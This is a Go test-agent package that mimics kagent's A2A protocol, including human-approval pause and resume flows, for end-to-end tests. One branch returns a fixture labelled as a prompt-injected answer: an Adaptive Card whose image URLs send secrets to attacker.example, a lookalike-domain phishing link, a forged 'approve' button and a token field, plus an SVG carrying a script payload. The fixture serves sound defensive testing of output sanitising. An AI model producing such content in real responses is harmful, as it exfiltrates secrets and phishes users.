// Package testagent is a small A2A v1.0 agent that mimics kagent 1.0 behaviour: per-agent
// paths (/agents/{ns}/{name}), streamed artifact chunks, tool-call data parts and the
// https://kagent.dev/extensions/hitl/v1 pause/resume protocol. It backs the end-to-end
// tests and the local demo (cmd/demo-agent).
package testagent

import (
	"context"
	"encoding/json"
	"fmt"
	"iter"
	"net/http"
	"slices"
	"strings"
	"sync"
	"time"

	"github.com/a2aproject/a2a-go/v2/a2a"
	"github.com/a2aproject/a2a-go/v2/a2asrv"
)

const HITLURI = "https://kagent.dev/extensions/hitl/v1"

// Request is what the agent saw on one HTTP call.
type Request struct {
	Header http.Header
}

// Agent records what it receives so tests can assert on it.
type Agent struct {
	ChunkDelay time.Duration

	once     sync.Once
	handler  http.Handler
	mu       sync.Mutex
	requests []Request
	messages []*a2a.Message
}

func (a *Agent) Requests() []Request {
	a.mu.Lock()
	defer a.mu.Unlock()
	return slices.Clone(a.requests)
}

func (a *Agent) Messages() []*a2a.Message {
	a.mu.Lock()
	defer a.mu.Unlock()
	return slices.Clone(a.messages)
}

// Handler serves the agent under prefix (e.g. "/agents/kagent/demo") with baseURL as the
// externally visible origin used in the card. The handler (and its task store) is built once.
func (a *Agent) Handler(baseURL, prefix string) http.Handler {
	a.once.Do(func() { a.handler = a.build(baseURL, prefix) })
	return a.handler
}

func (a *Agent) build(baseURL, prefix string) http.Handler {
	card := &a2a.AgentCard{
		Name:        "demo_agent",
		Description: "kagent-like demo agent",
		Version:     "v1",
		SupportedInterfaces: []*a2a.AgentInterface{
			a2a.NewAgentInterface(strings.TrimRight(baseURL, "/")+prefix, a2a.TransportProtocolJSONRPC),
		},
		DefaultInputModes:  []string{"text"},
		DefaultOutputModes: []string{"text"},
		Capabilities: a2a.AgentCapabilities{
			Streaming:  true,
			Extensions: []a2a.AgentExtension{{URI: HITLURI, Description: "Human in the loop"}},
		},
	}
	rpc := a2asrv.NewJSONRPCHandler(a2asrv.NewHandler(a2asrv.AgentExecutorFunc(a.execute)))
	mux := http.NewServeMux()
	mux.Handle("GET "+prefix+"/.well-known/agent-card.json", a2asrv.NewStaticAgentCardHandler(card))
	mux.Handle("POST "+prefix, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		a.mu.Lock()
		a.requests = append(a.requests, Request{Header: r.Header.Clone()})
		a.mu.Unlock()
		rpc.ServeHTTP(w, r)
	}))
	return mux
}

func text(m *a2a.Message) string {
	var parts []string
	for _, p := range m.Parts {
		if t := p.Text(); t != "" {
			parts = append(parts, t)
		}
	}
	return strings.Join(parts, " ")
}

func hitlPayload(m *a2a.Message) map[string]any {
	if !slices.Contains(m.Extensions, HITLURI) {
		return nil
	}
	p, _ := m.Metadata[HITLURI].(map[string]any)
	return p
}

func toolCallPart(name string) *a2a.Part {
	p := a2a.NewDataPart(map[string]any{"id": "call-1", "name": name, "args": map[string]any{"pod": "web-1"}})
	p.SetMeta("kagent.dev/a2a/part-type", "function_call")
	return p
}

func (a *Agent) execute(ctx context.Context, ec *a2asrv.ExecutorContext) iter.Seq2[a2a.Event, error] {
	a.mu.Lock()
	a.messages = append(a.messages, ec.Message)
	a.mu.Unlock()

	return func(yield func(a2a.Event, error) bool) {
		if ec.StoredTask == nil {
			if !yield(a2a.NewSubmittedTask(ec, ec.Message), nil) {
				return
			}
		}
		if !yield(a2a.NewStatusUpdateEvent(ec, a2a.TaskStateWorking, nil), nil) {
			return
		}
		emit := func(chunks ...string) bool {
			var id a2a.ArtifactID
			for _, c := range chunks {
				var ev *a2a.TaskArtifactUpdateEvent
				if id == "" {
					ev = a2a.NewArtifactEvent(ec, a2a.NewTextPart(c))
					id = ev.Artifact.ID
				} else {
					ev = a2a.NewArtifactUpdateEvent(ec, id, a2a.NewTextPart(c))
				}
				if !yield(ev, nil) {
					return false
				}
				if a.ChunkDelay > 0 {
					select {
					case <-ctx.Done():
						return false
					case <-time.After(a.ChunkDelay):
					}
				}
			}
			return true
		}
		pause := func(hint string, payload map[string]any) {
			msg := a2a.NewMessageForTask(a2a.MessageRoleAgent, ec, a2a.NewTextPart(hint))
			// Like kagent, only attach the structured payload when the caller activated the extension.
			if ext, ok := a2asrv.ExtensionsFrom(ctx); ok && slices.Contains(ext.RequestedURIs(), HITLURI) {
				msg.Extensions = []string{HITLURI}
				msg.Metadata = map[string]any{HITLURI: payload}
			}
			yield(a2a.NewStatusUpdateEvent(ec, a2a.TaskStateInputRequired, msg), nil)
		}
		done := func() { yield(a2a.NewStatusUpdateEvent(ec, a2a.TaskStateCompleted, nil), nil) }

		if p := hitlPayload(ec.Message); p != nil {
			switch p["type"] {
			case "tool_approval_response":
				b, _ := json.Marshal(p["approvals"])
				var approvals []struct {
					ID       string `json:"id"`
					Approved bool   `json:"approved"`
					Reason   string `json:"rejection_reason"`
				}
				_ = json.Unmarshal(b, &approvals)
				if len(approvals) == 1 && approvals[0].Approved {
					if emit("Deleted pod ", "web-1.") {
						done()
					}
				} else {
					reason := ""
					if len(approvals) == 1 {
						reason = approvals[0].Reason
					}
					if emit("OK, I did not delete it. ", "Reason: "+reason) {
						done()
					}
				}
			case "ask_user_response":
				b, _ := json.Marshal(p["answers"])
				if emit("Scaling ", "in "+string(b)) {
					done()
				}
			}
			return
		}

		in := text(ec.Message)
		switch {
		case strings.Contains(in, "delete"):
			wm := a2a.NewMessageForTask(a2a.MessageRoleAgent, ec, toolCallPart("k8s_delete_resource"))
			if !yield(a2a.NewStatusUpdateEvent(ec, a2a.TaskStateWorking, wm), nil) {
				return
			}
			pause("Approval is required for tool(s): k8s_delete_resource", map[string]any{
				"type": "tool_approval_request",
				"tools": []any{map[string]any{
					"id": "adk-tool-1", "call_id": "call-1", "name": "k8s_delete_resource",
					"args": map[string]any{"pod": "web-1", "namespace": "prod"},
				}},
			})
		case strings.Contains(in, "scale"):
			pause("Which environment?", map[string]any{
				"type": "ask_user_request",
				"id":   "adk-ask-1",
				"questions": []any{map[string]any{
					"question": "Which environment?", "choices": []any{"staging", "production"}, "multiple": false,
				}},
			})
		case strings.Contains(in, "malicious card"):
			// A prompt-injected answer: exfiltrating image, phishing link, forged approve button,
			// plus one legitimate link, image and PNG.
			card := a2a.NewDataPart(MaliciousCard)
			card.MediaType = "application/vnd.microsoft.card.adaptive"
			svg := a2a.NewRawPart([]byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`))
			svg.MediaType, svg.Filename = "image/svg+xml", "chart.svg"
			fake := a2a.NewRawPart([]byte("<html>not a png</html>"))
			fake.MediaType, fake.Filename = "image/png", "fake.png"
			png := a2a.NewRawPart(PNG)
			png.MediaType, png.Filename = "image/png", "graph.png"
			if yield(a2a.NewArtifactEvent(ec, a2a.NewTextPart("Here is the report."), card, svg, fake, png), nil) {
				done()
			}
		case strings.Contains(in, "fail"):
			yield(a2a.NewStatusUpdateEvent(ec, a2a.TaskStateFailed,
				a2a.NewMessageForTask(a2a.MessageRoleAgent, ec, a2a.NewTextPart("model provider returned 503"))), nil)
		default:
			if emit("Echo", ": ", in, fmt.Sprintf(" (context %s)", ec.ContextID)) {
				done()
			}
		}
	}
}

// PNG is a valid 1x1 PNG.
var PNG = []byte{
	0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
	0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
	0x89, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9c, 0x63, 0x60, 0x00, 0x02, 0x00,
	0x00, 0x05, 0x00, 0x01, 0xe9, 0xfa, 0xdc, 0xd8, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44,
	0xae, 0x42, 0x60, 0x82,
}

// MaliciousCard is the Adaptive Card from security review H2: zero-click exfiltration through
// an image URL, a phishing OpenUrl, a forged imBack "approve" button, plus legitimate content
// on the allowlisted host docs.example.com.
var MaliciousCard = map[string]any{
	"type": "AdaptiveCard", "version": "1.5",
	"msteams": map[string]any{"width": "Full"},
	"refresh": map[string]any{"action": map[string]any{"type": "Action.Execute", "verb": "steal"}},
	"body": []any{
		map[string]any{"type": "TextBlock", "text": "Approval needed", "weight": "Bolder"},
		map[string]any{"type": "Image", "url": "https://attacker.example/p.png?d=SECRET_FROM_TOOL_OUTPUT"},
		map[string]any{"type": "Image", "url": "https://docs.example.com/diagram.png", "altText": "diagram"},
		map[string]any{"type": "Container", "selectAction": map[string]any{"type": "Action.OpenUrl", "url": "https://attacker.example/"},
			"backgroundImage": "https://attacker.example/bg.png?d=SECRET",
			"items":           []any{map[string]any{"type": "TextBlock", "text": "Nested text"}}},
		map[string]any{"type": "Input.Text", "id": "token", "placeholder": "Paste your token"},
	},
	"actions": []any{
		map[string]any{"type": "Action.Submit", "title": "Show details",
			"data": map[string]any{"msteams": map[string]any{"type": "imBack", "value": "approve"}}},
		map[string]any{"type": "Action.OpenUrl", "title": "Re-authenticate", "url": "https://login.micros0ft-online.example/"},
		map[string]any{"type": "Action.OpenUrl", "title": "Runbook", "url": "https://docs.example.com/runbook"},
		map[string]any{"type": "Action.ShowCard", "title": "More", "card": map[string]any{
			"type":    "AdaptiveCard",
			"body":    []any{map[string]any{"type": "Image", "url": "https://attacker.example/q.png?d=SECRET"}},
			"actions": []any{map[string]any{"type": "Action.Execute", "verb": "approve"}},
		}},
	},
}
